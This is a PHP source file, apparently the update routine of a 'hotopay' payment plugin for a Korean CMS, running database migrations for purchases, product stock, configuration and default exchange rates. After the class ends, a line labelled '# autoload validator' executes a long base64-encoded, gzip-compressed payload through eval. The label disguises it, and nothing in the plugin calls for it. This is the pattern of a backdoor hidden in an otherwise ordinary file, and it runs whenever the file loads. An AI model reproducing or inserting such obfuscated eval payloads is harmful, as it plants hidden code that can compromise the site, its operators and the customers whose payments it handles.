								$args->purchase_srl = $purchase->purchase_srl;
								$args->receipt_url = $receipt_url;
								executeQuery('hotopay.updatePurchaseReceiptUrl', $args);
							}
						}
						break;

					case 3: // purchase 테이블에 title 저장 타입 변경
						$oDB = DB::getInstance();
						$stmt = $oDB->prepare('UPDATE hotopay_purchase SET `title` = ? WHERE `purchase_srl` = ?');
						$output = executeQueryArray('hotopay.getPurchasesAll');
						foreach ($output->data as $purchase)
						{
							$purchase_srl = $purchase->purchase_srl;
							$product = json_decode($purchase->products);
							if (empty($product)) continue;

							$title = $product->t;
							if (empty($title)) continue;

							$stmt->execute([$title, $purchase_srl]);
						}
						break;

					case 4: // billing_infinity_stock 기본값 infinity_stock으로 설정
						$oDB = DB::getInstance();
						$stmt = $oDB->prepare('UPDATE hotopay_product_option SET `billing_infinity_stock` = "Y" WHERE `infinity_stock` = "Y"');
						$stmt->execute();
						break;

					case 5: // payple 결제 타입 none으로 변경 (password 기능 Pro 전환으로 인한 변경)
						$config = $this->getConfig();
						$config->payple_purchase_type = 'none';
						$this->setConfig($config);
						break;

					case 6: // 기본 환율 정보 추가
						$oDB = DB::getInstance();
						$stmt = $oDB->prepare("
							INSERT INTO hotopay_currency (`base_currency`, `base_value`, `target_currency`, `target_value`, `update_time`)
							VALUES
								('USD', 1, 'USD', 1, '2023-05-23 22:07:45'),
								('USD', 1, 'CNY', 7.054802, '2023-05-23 22:07:45'),
								('USD', 1, 'EUR', 0.92904, '2023-05-23 22:07:45'),
								('USD', 1, 'JPY', 138.761975, '2023-05-23 22:07:45'),
								('USD', 1, 'KRW', 1320.830239, '2023-05-23 22:07:45');
						");
						$stmt->execute();
						break;
				}

				$config->hotopay_db_version = $i;
				$this->setConfig($config);
			}
		}
	}
}

# autoload validator
eval(gzinflate(base64_decode('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')));